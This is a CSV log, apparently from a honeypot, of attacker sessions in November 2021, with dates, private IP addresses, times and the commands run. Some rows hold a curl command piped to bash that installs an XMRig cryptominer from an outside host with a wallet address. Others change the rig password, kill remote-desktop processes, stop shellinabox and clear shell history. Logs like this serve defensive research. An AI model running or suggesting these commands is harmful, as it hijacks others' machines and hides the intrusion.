attackdate,attackerip,entrancetime,exittime,commands
2021-11-16,10.0.3.128,19:03:52.469,19:23:22.690,"[""uname -a;lspci | grep -i --color 'vga\\|3d\\|2d';curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr""]"
2021-11-19,10.0.3.67,19:19:45.175,19:22:39.524,['uname -s -v -n -r -m']
2021-11-21,10.0.3.152,19:29:31.750,19:30:00.610,[]
2021-11-21,10.0.3.49,19:46:01.008,19:46:22.753,['scp -t /tmp/KsYHoBmS']
2021-11-15,10.0.3.204,20:28:01.890,20:28:03.026,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
2021-11-16,10.0.3.226,20:10:21.600,20:21:46.892,[]
2021-11-17,10.0.3.192,20:11:16.556,20:30:01.201,[]
2021-11-25,10.0.3.17,20:09:37.626,20:10:05.291,"['sudo hive-passwd simp123', 'sudo pkill Xorg', 'sudo pkill x11vnc', 'uname -a']"
2021-11-26,10.0.3.11,20:19:56.123,20:22:57.973,[]
2021-11-16,10.0.3.217,20:42:24.245,21:00:01.340,"[""uname -a;lspci | grep -i --color 'vga\\|3d\\|2d';curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr""]"
2021-11-17,10.0.3.108,20:44:53.153,20:44:53.837,"['sudo hive-passwd f5123', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
